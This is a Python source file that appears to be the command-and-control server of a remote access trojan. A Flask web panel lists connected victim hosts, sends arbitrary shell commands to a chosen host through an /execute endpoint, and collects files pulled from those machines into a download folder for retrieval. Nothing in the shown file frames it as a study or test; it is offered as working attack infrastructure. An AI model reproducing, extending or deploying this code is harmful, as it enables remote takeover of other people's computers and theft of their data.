import json
import os
import socket
import threading

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

from common.ratsocket import RATSocket
from common.util import get_write_stream
from common.util import logger
from server.client import Client
from server.config import SOCKET_ADDR


class Server:

    def __init__(self, address):
        self.address = address
        self.socket = RATSocket()
        self.connections = {}

    def serve(self, recv=None):
        try:
            self.socket.bind(self.address)
            logger.info('Listening on port {}'.format(self.address[1]))
            self.socket.accept(self.connection_handler, recv)
        except socket.error as e:
            logger.error(e)

    def connection_handler(self, conn, addr, recv):
        conn.settimeout(5)
        try:
            connection = Client(conn)
            info = json.loads(connection.recv())
        except json.JSONDecodeError:
            conn.close()
            logger.error('Connection timed out: {}'.format(addr))
            return
        except Exception as e:
            logger.error('Error establishing connection: {}'.format(e))
            return
        conn.settimeout(None)
        info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
        connection = Client(conn, addr, info)
        self.connections[connection.id] = connection
        logger.info('Connection has been established: {}'.format(addr))
        threading.Thread(target=recv, args=(connection,), daemon=True).start()


app = Flask(__name__, static_url_path='', static_folder='server/static')
app.config['UPLOAD_FOLDER'] = os.path.join(app.root_path, 'server/download')
app.config['JSON_AS_ASCII'] = False
CORS(app)


def recv(conn):
    while 1:
        try:
            result_head = conn.recv_head()
            result_id = result_head['id']
            result_type = result_head['type']
            conn.info['cwd'] = result_head['cwd']
            result = None
            if result_type == 'result':
                result = result_head['status'], conn.recv_body(result_head)
            elif result_type == 'file':
                try:
                    filename = result_head['filename']
                    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                    conn.recv_body(result_head, file_stream=get_write_stream(file_path))
                    result = 1, f'File saved to: {os.path.abspath(file_path)}', filename
                except Exception as e:
                    result = 0, str(e)
            if result:
                conn.result[result_id] = result
        except socket.error:
            logger.error(f'Connection closed: {conn.address}')
            if conn.id in server.connections:
                del server.connections[conn.id]
            break
        except Exception as e:
            logger.error(e)


@app.route('/list', methods=['POST'])
def list_connections():
    connections = []
    for k, v in server.connections.items():
        connections.append({'id': k, 'hostname': v.info['hostname'], 'address': v.info['addr'], 'cwd': v.info['cwd']})
    logger.info(f'Connections: {connections}')
    return jsonify(connections)


@app.route('/execute', methods=['POST'])
def execute():
    conn = None
    try:
        target = request.get_json()['target']
        command = request.get_json()['command']
        conn = server.connections.get(target)
        if not conn:
            return jsonify({
                'status': 0,
                'result': 'Connection does not exist'
            })
        command_id = conn.send_command(command)
        while 1:
            result = conn.result.get(command_id)
            if result:
                filename = None
                if len(result) == 3:
                    filename = result[2]
                return jsonify({
                    'status': result[0],
                    'result': result[1],
                    'file': filename if filename else None,
                    'cwd': conn.info['cwd']
                })
    except socket.error:
        if conn.id in server.connections:
            del server.connections[conn.id]
        return jsonify({
            'status': 0,
            'result': 'Connection is lost'
        })
    except Exception as e:
        return jsonify({
            'status': 0,
            'result': str(e),
            'cwd': conn.info['cwd']
        })


@app.route('/')
def index():
    return send_from_directory('server/static', 'index.html')


@app.route('/download/<path:filename>', methods=['GET'])
def download(filename):
    uploads = os.path.join(app.root_path, app.config['UPLOAD_FOLDER'])
    return send_from_directory(uploads, filename)


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, args=(recv,), daemon=True).start()
    app.run(host='0.0.0.0', port=9998)
